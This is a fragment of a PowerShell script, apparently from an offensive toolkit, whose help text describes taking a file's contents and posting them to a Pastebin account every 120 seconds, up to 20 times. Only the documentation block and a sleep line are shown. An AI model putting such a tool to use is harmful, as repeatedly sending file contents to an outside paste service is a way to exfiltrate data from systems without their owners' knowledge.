<#
.SYNOPSIS
   Send file data contents to pastebin.
...
.DESCRIPTION
   Uses Out-PasteBin.ps1 cmdlet to take the contents of -filepath
   and creates a new pastebin paste from it on the sellected account
   with sellected time intervals (120) a max of 20 times (20 pastes)
...
.Parameter TimeOut
   Create paste each xx seconds (default: 120)
...
.EXAMPLE
   PS C:\> .\SendToPasteBin.ps1 -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
   Get the contents of -filepath 'string' and creates a new pastebin paste from it on sellected account.
...
{
   Start-Sleep -Seconds $TimeOut #Loop function timeout
